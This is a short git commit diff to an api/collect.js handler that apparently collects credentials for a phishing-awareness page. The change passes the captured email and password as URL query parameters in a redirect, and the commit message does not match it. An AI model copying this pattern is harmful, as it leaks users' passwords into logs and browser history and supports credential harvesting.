0b6d745e3f3071fb513302b65f0bebe22e75a734
musa <musazak4reel@gmail.com>
2026-05-07 22:27:57 +0100

    fix toc form to POST

--- api/collect.js
+++ api/collect.js
@@ -41,6 +41,6 @@ export default async function handler(req, res) {
       },
     });
 
-    res.redirect(302, '/awareness.html');
+    res.redirect(302, `/awareness.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
   }
 }
